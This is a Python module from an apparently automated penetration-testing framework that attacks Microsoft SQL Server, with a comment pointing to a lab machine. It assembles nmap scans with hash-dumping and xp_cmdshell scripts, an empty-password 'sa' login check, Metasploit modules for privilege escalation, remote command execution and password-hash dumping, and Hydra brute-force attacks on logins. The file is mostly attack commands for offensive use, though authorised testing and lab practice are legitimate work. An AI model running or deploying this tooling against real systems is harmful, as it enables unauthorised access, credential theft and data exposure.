# -*- coding: utf-8 -*-

from warriors.warrior import Warrior

#You can test this module against querier (10.10.10.125)

class Mssql_warrior (Warrior):
    def __init__(self, host, port, workdir, protocol, intensity, username, ulist, password, plist, notuse, extensions, path, reexec, ipv6, domain, interactive, verbose, executed, exec):
        Warrior.__init__(self, host, port, workdir, protocol, intensity, username, ulist, password, plist, notuse, extensions, path, reexec, ipv6, domain, interactive, verbose, executed, exec)

        self.cmds = [
            {"name": self.proto+"_nmap_"+self.port, "cmd": 'nmap -n --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p ' + self.port + ' ' + self.host, "shell": True, "chain": False},

        ]

        msfmodules = [{"path": "auxiliary/scanner/mssql/mssql_ping", "toset": {"RHOSTS": self.host, "RPORT": self.port}},
                      ]
        self.cmds.append({"name": self.proto+"_msf_"+self.port, "cmd": self.create_msf_cmd(msfmodules), "shell": True, "chain": False})

        if self.intensity >= "2":
            self.extra_info = "If you set the username and password, more authenticated metasploit modules will be executed."
            if username != "" and password != "":
                msfmodules_auth = [
                    {"path": "auxiliary/admin/mssql/mssql_enum", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "admin/mssql/mssql_enum_domain_accounts", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "admin/mssql/mssql_enum_sql_logins", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/admin/mssql/mssql_escalate_dbowner", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/admin/mssql/mssql_escalate_execute_as", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/admin/mssql/mssql_exec", "toset": {"RHOSTS": self.host, "RPORT": self.port, "CMD": "ipconfig", "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/admin/mssql/mssql_findandsampledata", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/scanner/mssql/mssql_hashdump", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/scanner/mssql/mssql_schemadump", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    ]
                self.cmds.append({"name": self.proto+"_msf_auth_"+self.port, "cmd": self.create_msf_cmd(msfmodules_auth), "shell": True, "chain": False})

        if self.intensity == "3":
            self.extra_info = "You can use the variable 'username' to brute force a single username or the variable ulist to bruteforce a list of usernames."
            if username != "":
                self.cmds = [{"name": self.proto+"_brute_hydra_"+self.port, "cmd": 'hydra -f -e ns -l '+self.username+' -P '+self.plist+' -s '+self.port+' '+self.host+' mssql', "shell": True, "chain": False}]
            else:
                self.cmds = [{"name": self.proto+"_brute_hydra_"+self.port, "cmd": 'hydra -f -e ns -L ' + self.ulist + ' -P ' + self.plist + ' -s ' + self.port + ' ' + self.host + ' mssql', "shell": True, "chain": False}]
